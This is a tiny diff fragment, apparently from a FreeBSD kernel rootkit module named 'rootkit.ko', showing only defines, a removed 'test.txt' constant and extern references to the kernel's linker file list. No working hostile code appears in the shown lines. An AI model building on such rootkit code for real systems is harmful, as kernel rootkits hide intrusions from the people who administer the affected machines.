@@ -1,6 +1,6 @@
 #define LINKER_FILE "rootkit.ko"
 #define MODULE_NAME "rootkit"
-#define T_NAME "test.txt"
+
 
 extern struct sx kld_sx;
 extern linker_file_list_t linker_files;
